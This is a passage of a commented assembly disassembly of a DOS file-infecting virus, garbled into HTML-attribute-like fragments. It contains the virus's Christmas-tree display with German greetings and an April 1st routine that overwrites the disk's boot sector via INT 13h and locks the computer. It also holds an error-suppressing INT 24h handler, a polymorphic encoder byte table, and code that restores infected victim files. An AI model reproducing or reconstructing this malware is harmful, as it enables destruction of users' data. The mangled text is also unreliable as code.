mov="" al,0adh="" ;'­'="" ;05dd="" b0ad="" call="" l0667="" ;write="" as="" tty="" ;05df="" e88500="" call="" l05cd="" ;write="" cr/lf="" ;05e2="" e8e8ff="" mov="" bx,3="" ;05e5="" bb0300="" mov="" dx,0026h="" ;05e8="" ba2600="" l05eb:="" mov="" cx,dx="" ;05eb="" 8bca="" call="" l05c3="" ;write="" [cx]="" spaces="" ;05ed="" e8d3ff="" mov="" cx,bx="" ;05f0="" 8bcb="" mov="" al,2ah="" ;'*'="" ;05f2="" b02a="" call="" l05c5="" ;write="" [al]="" [cx]="" times="" ;05f4="" e8ceff="" call="" l05cd="" ;write="" cr/lf="" ;05f7="" e8d3ff="" dec="" dx="" ;05fa="" 4a="" add="" bx,2="" ;05fb="" 83c302="" cmp="" bx,1fh="" ;05fe="" 83fb1f="" jnz="" l05eb="" ;0601="" 75e8="" mov="" bx,3="" ;0603="" bb0300="" l0606:="" mov="" cx,0026h="" ;0606="" b92600="" call="" l05c3="" ;write="" [cx]="" spaces="" ;0609="" e8b7ff="" mov="" cx,3="" ;060c="" b90300="" mov="" al,0dbh="" ;'û'="" ;060f="" b0db="" call="" l05c5="" ;write="" [al]="" [cx]="" times="" ;0611="" e8b1ff="" call="" l05cd="" ;write="" cr/lf="" ;0614="" e8b6ff="" dec="" bx="" ;0617="" 4b="" jnz="" l0606="" ;0618="" 75ec="" mov="" cx,0050h="" ;061a="" b95000="" mov="" al,0cdh="" ;'í'="" ;061d="" b0cd="" call="" l05c5="" ;write="" [al]="" [cx]="" times="" ;061f="" e8a3ff="" mov="" cx,0013h="" ;0622="" b91300="" call="" l05c3="" ;write="" [cx]="" spaces="" ;0625="" e89bff="" mov="" bx,offset="" l0674="" ;text="" ;0628="" bb7406="" call="" l065a="" ;display="" string="" (first="" part)="" ;062b="" e82c00="" mov="" cx,001dh="" ;062e="" b91d00="" call="" l05c3="" ;write="" [cx]="" spaces="" ;0631="" e88fff="" jmp="" short="" l065a="" ;display="" string="" (secnd="" part);0634="" eb24="" nop="" ;0636="" 90="" ;="=======================================================" ;="" display="" 'april...'="" &="" lock="" ;--------------------------------------------------------="" l0637:="" call="" l063a="" ;0637="" e80000="" l063a:="" pop="" bx="" ;063a="" 5b="" add="" bx,0dh="" ;l063a+0dh="L0647" ;063b="" 83c30d="" mov="" ax,cs="" ;063e="" 8cc8="" mov="" ds,ax="" ;0640="" 8ed8="" call="" l065a="" ;display="" string="" ;0642="" e81500="" l0645:="" jmp="" l0645="" ;lock="" computer="" ;0645="" ebfe="" l0647="" db="" 'april,="" '="" ;0647="" 41="" 70="" 72="" 69="" 6c="" 2c="" 20="" db="" 'april="" '="" ;064e="" 41="" 70="" 72="" 69="" 6c="" 20="" db="" '...="" ',7,0="" ;0654="" 2e="" 2e="" 2e="" 20="" 07="" 00="" ;="=======================================" ;="" display="" string="" ;----------------------------------------="" l065a:="" mov="" al,[bx]="" ;065a="" 8a07="" inc="" bx="" ;065c="" 43="" or="" al,al="" ;065d="" 0ac0="" jz="" l0666="" ;065f="" 7405="" call="" l0667="" ;write="" as="" tty="" ;0661="" e80300="" jmp="" l065a="" ;0664="" ebf4="" l0666:="" ret="" ;0666="" c3="" ;="=======================================" ;="" write="" as="" tty="" ;----------------------------------------="" l0667:="" push="" dx="" ;0667="" 52="" push="" cx="" ;0668="" 51="" push="" bx="" ;0669="" 53="" xor="" bh,bh="" ;066a="" 32ff="" mov="" ah,0eh="" ;066c="" b40e="" int="" 10h="" ;066e="" cd10="" pop="" bx="" ;0670="" 5b="" pop="" cx="" ;0671="" 59="" pop="" dx="" ;0672="" 5a="" ret="" ;0673="" c3="" l0674="" db="" 'und="" er="" lebt="" '="" ;0674="" 55="" 6e="" 64="" 20="" 65="" 72="" 20="" 6c="" ;067c="" 65="" 62="" 74="" 20="" db="" 'doch="" noch="" :="" '="" ;0680="" 64="" 6f="" 63="" 68="" 20="" 6e="" 6f="" 63="" ;0688="" 68="" 20="" 3a="" 20="" db="" 'der="" tannenbaum="" !'="" ;068c="" 44="" 65="" 72="" 20="" 54="" 61="" 6e="" 6e="" ;0696="" 65="" 6e="" 62="" 61="" 75="" 6d="" 20="" 21="" db="" 0dh,0ah,0="" ;069c="" 0d="" 0a="" 00="" db="" 'frohe="" weihnachten="" ...'="" ;069f="" 46="" 72="" 6f="" 68="" 65="" 20="" 57="" 65="" ;06a7="" 69="" 68="" 6e="" 61="" 63="" 68="" 74="" 65="" ;06af="" 6e="" 20="" 2e="" 2e="" 2e="" db="" 0dh,0ah,7,0="" ;06b4="" 0d="" 0a="" 07="" 00="" ;="=======================================" ;="" destruction="" (1st="" of="" april)="" ;----------------------------------------="" l06b8:="" xor="" dh,dh="" ;head="0" ;06b8="" 32="" f6="" mov="" cx,0001h="" ;track="" 0,="" sector="" 1="" ;06ba="" b9="" 01="" 00="" mov="" bx,offset="" l0637="" ;display="" 'april...'&lock;06bd="" bb3706="" mov="" ax,0301h="" ;write="" 1="" sector="" ;06c0="" b80103="" int="" 13h="" ;06c3="" cd13="" ret="" ;06c5="" c3="" ;="=======================================" ;="" new="" int="" 24h="" routine="" ;----------------------------------------="" l06c6:="" mov="" al,00="" ;ignore="" error="" ;06c6="" b000="" iret="" ;06c8="" cf="" ;="=======================================" ;="" changable="" bytes="" of="" encoder="" procedure="" ;----------------------------------------="" l06c9="" db="" 05eh,000h,00fh,043h="" ;06c9="" 5e="" 00="" 0f="" 43="" db="" 05eh,030h,00fh,043h="" ;06cd="" 5e="" 30="" 0f="" 43="" db="" 05eh,0d2h,007h,043h="" ;06d1="" 5e="" d2="" 07="" 43="" db="" 076h,000h,00ch,046h="" ;06d5="" 76="" 00="" 0c="" 46="" db="" 076h,030h,00ch,046h="" ;06d9="" 76="" 30="" 0c="" 46="" db="" 076h,0d2h,004h,046h="" ;06dd="" 76="" d2="" 04="" 46="" db="" 07eh,000h,00dh,047h="" ;06e1="" 7e="" 00="" 0d="" 47="" db="" 07eh,030h,00dh,047h="" ;06e5="" 7e="" 30="" 0d="" 47="" db="" 07eh,0d2h,005h,047h="" ;06e9="" 7e="" d2="" 05="" 47="" l06ed="" db="" 28h,30h,0d2h="" ;06ed="" 28="" 30="" d2="" ;="=======================================" ;="" pattern="" to="" restore="" victim="" bytes="" ;----------------------------------------="" l06f0:="" repz="" movsb="" ;06f0="" f3="" a4="" mov="" si,cx="" ;06f2="" 8b="" f1="" mov="" di,cx="" ;06f4="" 8b="" f9="" retn="" ;06f6="" c3="" l06f7="" dw="" 0703h="" ;saved="" victim="" length="" ;06f7="" 03="" 07="" l06f9="" dw="" 63dbh="" ;victim="" length+100h="" ;06f9="" db="" 63="" l06fb="" dw="" 03c6h="" ;saved="" virus="" length="" ;06fb="" c6="" 03="" l06fd="" dw="" 0603h="" ;virus="" length="" ;06fd="" 03="" 06="" l06ff="" dw="" 6000h="" ;victim="" time="" ;06ff="" 00="" 60="" l0701="" dw="" 0e71h="" ;victim="" date="" ;0701="" 71="" 0e="" l0703="" label="" byte="" ;disk="" buffer="" ;="==============================================" ;="" rest="" of="" victim="" code="" follow="" here="" ;="" on="" the="" end="" follow="" first="" 1539="" bytes="" ;="" fom="" beginning="" of="" file="" ;-----------------------------------------------="" cseg="" ends="" end="" l0100="" =""></-----></-></-></-></-></->